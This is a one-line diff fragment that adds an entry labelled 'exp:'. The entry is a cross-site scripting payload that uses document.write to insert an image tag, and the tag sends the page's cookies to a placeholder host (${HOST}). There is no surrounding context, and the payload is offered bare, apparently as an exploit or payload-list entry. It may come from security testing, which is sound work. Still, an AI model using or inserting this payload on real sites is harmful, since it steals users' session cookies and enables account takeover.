@@ -1,0 +1,1 @@
+exp:<script>document.write("<img src=${HOST}?tk="+document.cookie+" />");</script>
